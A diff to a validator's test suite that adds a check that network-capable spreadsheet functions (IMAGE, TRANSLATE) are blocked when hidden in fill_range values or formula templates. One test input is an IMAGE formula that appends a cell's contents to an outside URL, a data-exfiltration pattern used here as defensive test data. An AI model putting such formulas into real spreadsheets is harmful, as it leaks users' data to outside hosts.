@@ -58,6 +58,15 @@ describe("validateResponse", () => {
     );
   });
 
+  it("blocks network functions hidden inside fill_range values and templates", () => {
+    expect(errors(run([{ type: "fill_range", range: "A1:A2", values: [["ok"], ['=IMAGE("https://x/?"&B1)']] }]))[0]).toContain(
+      "IMAGE is blocked",
+    );
+    expect(errors(run([{ type: "fill_range", range: "A1:A2", formulaTemplate: "=TRANSLATE(B{row},\"en\",\"fr\")" }]))[0]).toContain(
+      "TRANSLATE is blocked",
+    );
+  });
+
   it("warns about circular references and overlapping writes", () => {
     const r = run([
       { type: "write_formula", cell: "A1", formula: "=A1+1" },
